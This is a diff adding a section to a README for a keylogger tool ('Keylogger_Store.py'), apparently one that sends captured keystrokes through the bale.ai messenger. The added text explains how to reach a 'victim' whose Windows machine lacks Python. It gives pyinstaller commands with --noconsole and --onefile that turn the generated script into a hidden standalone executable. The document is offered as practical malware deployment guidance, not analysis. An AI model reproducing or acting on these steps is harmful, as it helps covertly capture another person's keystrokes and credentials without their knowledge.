@@ -45,6 +45,24 @@ python Keylogger_Store.py
 ```
 And I explained the rest of the instructions above. What to do after execution: Proceed exactly as described above.
 
+# What if our victim didn't have Python on her Windows?
+Here you must first create the desired file with the tool. For example, the name of our output file is 👇
+```
+key.py
+```
+And after the following command, you install the pyinstaller library 👇
+```
+pip install pyinstaller
+```
+And then with the following command, you convert the file you created with the tool into an exe file and a Windows executable file. 👇
+```
+pyinstaller --noconsole --onefile --hidden-import=pynput --hidden-import=requests --hidden-import=colorama --clean namefile.py
+```
+For example
+```
+pyinstaller --noconsole --onefile --hidden-import=pynput --hidden-import=requests --hidden-import=colorama --clean key.py
+```
+
 # What should I do if I am not Iranian and do not have access to the Iranian messenger bale.ai?
 Just open the source code of the Keylogger_Store.py file and wherever this address was
 ```
